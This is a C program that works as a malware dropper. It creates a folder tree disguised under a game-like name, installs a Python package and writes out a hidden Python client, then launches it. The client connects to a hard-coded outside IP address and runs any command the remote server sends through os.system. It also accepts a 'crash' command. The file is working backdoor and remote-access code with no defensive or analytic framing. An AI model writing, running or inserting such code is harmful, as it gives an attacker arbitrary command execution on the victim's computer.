#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    srand(time(NULL));
    int num = rand() % 100;
    char virusFile[100];
    sprintf(virusFile,"C:\\Games\\MiNdustry021332\\%i\\client.py", num);
    system("pip install -U pyautogui");
    system("mkdir C:\\Games\\MiNdustry021332");
    for(int i=0;i<100; i++) {
    char filename[100];
    sprintf(filename,"mkdir C:\\Games\\MiNdustry021332\\%i", i); 
        system(filename);

    }
    FILE *file = fopen(virusFile, "w");
    if (file == NULL) {
        printf("Error opening file.");
        printf(virusFile);
        return 1;
    }

    fputs("\nimport socket\nimport os\nimport random\nimport time\nimport itertools\n\nclass CommandFIlter:\n\tdef __init__(self):\n\t\tpass # тут уже добавь\n\nhost = '26.199.90.194'\nport = 12345\ncalc = 'C:/Windows/System32/calc.exe'\nclient_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nprint('Client started...')\n\nwhile True:\n\ttry:\n\t\tclient_socket.connect((host, port))\n\n\t\twhile True:\n\t\t\t\tdata = client_socket.recv(1024)\n\t\t\t\tserver_answer = data.decode().split()\n\t\t\t\tif not server_answer is None:\n\t\t\t\t\tif server_answer[0]=='run':\n\t\t\t\t\t\tif server_answer[1]=='-s':\n\t\t\t\t\t\t\tis_system = 'C:/Windows/System32/'+server_answer[2]\n\t\t\t\t\t\t\tos.system(is_system)\n\t\t\t\t\t\t\tanswer_for_server = f'RUN: {server_answer[2]}'\n\t\t\t\t\t\t\t\n\t\t\t\t\t\telse:\n\t\t\t\t\t\t\tos.system(server_answer[1])\n\t\t\t\t\t\t\tanswer_for_server = f'RUN: {server_answer[1]}'\n\t\t\t\t\telif server_answer[0]=='crash':\n\t\t\t\t\t\tanswer_for_server = 'crashing computer'\n\t\t\t\t\t\tfor a,b,c in itertools.product(itertools.count(0), range(0,10), range(0,10)):\n\t\t\t\t\t\t\tprint(a,b,c)\n\t\t\t\t\t\t\tif a > 20: break\n\t\t\t\t\telif server_answer[0]=='disconnect': break\n\t\t\t\t\telse: answer_for_server = 'Command not found'\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\tclient_socket.send(answer_for_server.encode())\n\t\t\t\telse: pass\n\t\t\n\texcept socket.error as e:\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t  \n\t\tprint(f'Error: {e}')\n\t\t# client_socket.close()\n\t\tprint('sleep')\n\t\ttime.sleep(random.randint(0, 10))\n\t\tprint('unsleep')\n", file);
    fclose(file);
    char start[150];
    sprintf(start,"python %s", virusFile);
    printf(start);
    printf(virusFile);
    system(start);
    return 0;
}